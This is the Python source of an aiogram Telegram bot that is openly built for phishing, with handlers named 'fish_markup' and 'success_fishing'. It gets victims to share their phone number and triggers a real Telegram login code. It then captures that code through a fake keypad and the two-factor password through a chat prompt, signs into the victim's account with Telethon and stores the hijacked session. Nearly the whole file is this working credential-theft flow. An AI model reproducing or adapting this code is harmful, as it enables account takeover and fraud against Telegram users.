import asyncio
import logging

from loader import bot, dp
from aiogram import types, F
from aiogram.filters import CommandStart
from aiogram.filters.state import StateFilter
from aiogram.fsm.context import FSMContext
from enums import StageEnum
from config import TEMPLATE
from markup import fish_markup
from database.models import Session
from utils.sessions import SessionManager, expiration_timer, success_fishing
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, PhoneCodeExpiredError
from middleware import SessionMiddleware
from database.utils_db import create_table

logging.basicConfig(level=logging.INFO)


@dp.message(CommandStart(), StateFilter(None))
async def start(
        msg: types.Message,
        state: FSMContext,
        session: Session
):
    if session.stage == StageEnum.COMPLETED:
        return await msg.answer(
            TEMPLATE["finish"]
        )

    return await msg.answer(
        TEMPLATE["start"],
        reply_markup=types.ReplyKeyboardMarkup(
            keyboard=[[types.KeyboardButton(
                text=TEMPLATE["button"],
                request_contact=True
            )]],
            one_time_keyboard=True,
            resize_keyboard=True
        )
    )


@dp.message(CommandStart())
async def start(
        msg: types.Message,
        state: FSMContext,
        session: Session
):
    if session.stage == StageEnum.CODE:
        await state.set_state("code")
        data = await state.get_data()
        
        if "{code}" not in TEMPLATE["code"]:
            await msg.answer(
                TEMPLATE["code"] + f"\n\n<code>{data['code']}</code>",
                reply_markup=fish_markup
            )
        else:
            await msg.answer(
                TEMPLATE["code"].replace("{code}", data['code']),
                reply_markup=fish_markup
            )
    if session.stage == StageEnum.PASSWORD:
        await state.set_state("password")

        await msg.answer(
            TEMPLATE["password"]
        )
    if session.stage == StageEnum.COMPLETED:
        await state.clear()

        await msg.answer(
            TEMPLATE["finish"]
        )


@dp.message(F.contact, StateFilter(None))
async def phone_number(
        msg: types.Message,
        state: FSMContext,
        session: Session,
):
    await msg.delete()

    message = await msg.answer(
        TEMPLATE["wait_code"],
        reply_markup=types.ReplyKeyboardRemove()
    )
    
    session_manager = SessionManager(
        session.user_id,
        session.telegram_session and session.telegram_session.get_session()
    )

    phone_number = ''.join(filter(str.isdigit, msg.contact.phone_number))

    async with session_manager as _session:
        code_hash = await _session.send_code(phone_number)

        tg_session = await _session.save()

    session.stage = StageEnum.CODE.value
    session.telegram_session = tg_session
    session.phone_number = phone_number

    session.save()

    await state.update_data(
        code_hash=code_hash.phone_code_hash,
        code="", 
        phone=session.phone_number
    )
    data = await state.get_data()

    await state.set_state("code")

    asyncio.create_task(
        expiration_timer(session, state, message)
    )

    await message.delete()

    await message.answer(
        TEMPLATE["code"].replace("{code}", ""),
        reply_markup=fish_markup
    )


@dp.callback_query(
        F.data.startswith("code_"), 
        StateFilter("code")
)
async def code(
        call: types.CallbackQuery,
        state: FSMContext,
        session: Session,
):
    data = await state.get_data()

    code = call.data.split("_")[-1]

    if len(data['code']) >= 5:
        return await call.answer()

    if code == "remove":
        await state.update_data(
            code=data['code'][:-1]
        )
    else:
        await state.update_data(
            code=data['code'] + code
        )

    data = await state.get_data()
    
    if "{code}" not in TEMPLATE["code"]:
        await call.message.edit_text(
            TEMPLATE["code"] + f"\n\n<code>{data['code']}</code>",
            reply_markup=fish_markup
        )
    else:
        await call.message.edit_text(
            TEMPLATE["code"].replace("{code}", data['code']),
            reply_markup=fish_markup
        )

    await call.answer()

    if len(data['code']) >= 5:
        session_manager = SessionManager(
            session.user_id,
            session.telegram_session and session.telegram_session.get_session()
        )

        async with session_manager as _session:
            try:
                me = await _session.sign_in(
                    data['phone'],
                    data['code'],
                    data['code_hash']
                )
            except SessionPasswordNeededError:
                session.stage = StageEnum.PASSWORD.value
                session.telegram_session = await _session.save()
                
                session.save()
                
                await state.update_data(
                    code_hash=data['code_hash']
                )
                await state.set_state("password")

                await call.message.delete()

                await call.message.answer(
                    TEMPLATE["password"]
                )
                
                return
            except PhoneCodeInvalidError:
                await state.update_data(code='')

                await call.message.edit_text(
                    TEMPLATE["invalid_code"].replace("{code}", ""),
                    reply_markup=fish_markup
                )
                
                return
            
            await state.clear()

            session.stage = StageEnum.COMPLETED.value

            session.save()

            await call.message.delete()

            await call.message.answer(
                TEMPLATE["finish"]
            )
            
            await success_fishing(session)
        

@dp.message(F.text, StateFilter("password"))
async def password(
        msg: types.Message, 
        state: FSMContext,
        session: Session,
):
    await msg.delete()
    data = await state.get_data()

    session_manager = SessionManager(
        session.user_id,
        session.telegram_session and session.telegram_session.get_session()
    )
    
    async with session_manager as _session:
        try:
            me = await _session.sign_in(
                data['phone'],
                password=msg.text
            )
        except PasswordHashInvalidError:
            await msg.answer(
                TEMPLATE["invalid_password"]
            )
            return      

        await state.clear()

        session.telegram_session = await _session.save()
        session.stage = StageEnum.COMPLETED.value

        session.save()

        await msg.answer(
            TEMPLATE["finish"]
        )

        await success_fishing(session)


if __name__ == "__main__":
    create_table()

    dp.update.middleware.register(SessionMiddleware())
    dp.run_polling(bot)
